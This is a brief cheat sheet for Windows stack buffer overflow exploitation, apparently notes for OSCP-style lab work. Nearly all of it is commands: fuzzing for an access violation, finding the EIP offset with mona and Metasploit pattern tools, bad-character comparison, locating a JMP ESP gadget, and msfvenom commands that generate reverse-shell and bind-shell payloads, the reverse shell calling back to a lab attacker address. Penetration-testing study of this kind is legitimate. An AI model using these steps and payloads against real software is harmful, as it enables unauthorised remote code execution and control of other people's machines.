# Buffer Overflow

## 1 - Find the access violation

```
A * 30000
```
> Access Violation 41414141

## 2 - Find EIP using pattern (-q EIP address)

Generate pattern
```
!mona pattern_create 30000
```
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 30000 > bufferoverflow_pattern.txt
```

Search for pattern
```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP address> -l 30000
```
```
!mona findmsp
```
```
!mona pattern_offset <EIP address>
```

## 3 - Find bad char

```
!mona bytearray -cpb '\x00\x09\x0a’
```
```
!mona compare -f C:\logs\<app>\bytearray.bin -a 000FF730
```

## 4 - Find JMP ESP (this in case shellcode is in ESP) 
- Address cannot have bad char
- Consider MSVCP60.dll and kernetl32.dll

```
!mona jmp -r ESP
```

## 5 - Create shell code without bad char

reverse shell
```
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=192.168.110.128 LPORT=4444 -b '\x00\x09\x0a' -f python -v shell
```
bind shell
```
msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LPORT=4444 -e x86/alpha_mixed -b '\x00' BufferRegister=ESP -f python -v shell
```

## 6 - Place shell later after ESP

```
buffer += b'\x90' * 10
```

## 7 - Run exploit

Excute the exploit


## Links
 - [OSCP Stack Based Buffer Overflow Cheat Sheet](https://nop-blog.tech/oscp/bof-cheatsheet/)
 - [Msfvenom All in One cheatsheet](https://blog.certcube.com/oscp-msfvenom-all-in-one-cheatsheet/)